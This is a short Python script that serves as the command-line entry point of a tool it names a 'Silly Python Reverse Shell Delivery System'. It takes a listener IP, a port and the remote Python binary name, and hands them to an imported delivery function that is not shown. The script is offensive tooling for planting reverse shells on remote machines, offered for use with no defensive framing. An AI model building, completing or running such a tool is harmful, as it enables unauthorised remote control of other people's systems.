import argparse
from delivery.delivery import just_use_a_http_server_bro

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="Silly Python Reverse Shell Delivery System by dotpy")
    parser.add_argument("ip", type=str, help="local ip")
    parser.add_argument("port", type=int, help="local port")
    parser.add_argument("python", type=str, help="name of the python binary on the remote system (usually python or python3)")
    args = parser.parse_args()
    just_use_a_http_server_bro(args.ip, args.port, args.python)
